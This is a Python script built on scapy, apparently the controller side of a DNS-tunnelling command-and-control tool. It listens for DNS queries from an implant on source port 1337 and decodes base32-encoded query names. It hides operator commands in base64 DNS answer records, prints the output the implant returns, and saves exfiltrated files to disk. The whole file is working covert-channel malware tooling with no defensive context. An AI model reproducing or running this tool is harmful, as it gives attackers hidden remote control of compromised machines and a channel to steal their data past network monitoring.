#!/usr/bin/python3

from scapy.all import *
from threading import Thread, Lock, Semaphore
from base64 import *
import time

avail_cmd = Semaphore(0)
avail_print = Semaphore(1)
command = ""
msg = ""
stop = 0


def parse_end(packet):
    if ('END' == b32decode(packet[DNS].qd[DNSQR].qname.split(".")[0].decode('utf-8').replace('-', '=')).decode('utf-8').split()[-1]):
        return True

    return False


def concat_msg(packet):
    global msg
    msg += b32decode(packet[DNS].qd[DNSQR].qname.split(".")[0].decode('utf-8').replace('-', '=')).decode('utf-8')


def send_cmd(packet, command):
    try:
        dns_rep = IP(dst=packet[0][IP].src, id=packet[0][IP].id)/UDP(dport=packet[0][UDP].src, sport=53)/DNS(qd=packet[0][DNS].qd, an=DNSRR(ttl=0, rdata=b64encode(command.encode('utf-8'))))
        send(dns_rep, verbose=False)
    except Exception as e:
        print("in send_cmd: ")
        print(e)
    finally:
        return


def parse_msg(msg_lst):
    try:
        if(msg_lst[-2] == 'RUN'):
            print("\n".join(msg_lst[0:-2]))

        elif(msg_lst[-2] == 'FILE'):
            with open("outputfile"+str(parse_msg.counter), 'wb+') as f:
                f.write(bytearray.fromhex("".join(msg_lst[0:-2])))
            parse_msg.counter += 1
    except Exception as e:
        print("in parse_msg: ")
        print(e)

    finally:
        avail_print.release()
        return


parse_msg.counter = 1


def recieve_msg():
    try:
        global stop
        global command
        while not stop:
            global msg
            prailer = "START "
            msg = ""
            rp = sniff(filter="(udp dst port 53) and (udp src port 1337)",
                       prn=concat_msg, stop_filter=parse_end, timeout=100)
            msg_lst = msg.split()
            if('READY' == msg_lst[0] and avail_cmd.acquire(blocking=False)):
                send_cmd(rp, prailer+command)
            elif('READY' != msg_lst[0]):
                parse_msg(msg_lst)
    except Exception as e:
        print("in recieve_msg: ")
        print(e)
    finally:
        return


def main():
    try:
        rcv_thrd = Thread(target=recieve_msg)
        rcv_thrd.start()
    except:
        print("cant start listen/response threads")

    try:
        global command
        while True:
            avail_print.acquire(timeout=60)
            command = input("Enter command: ")
            if(command == 'stop'):
                global stop
                stop = 1
                break
            avail_cmd.release()

    except Exception as e:
        print("in main: "+e)

    finally:
        rcv_thrd.join()
        return 0


if __name__ == "__main__":
    main()
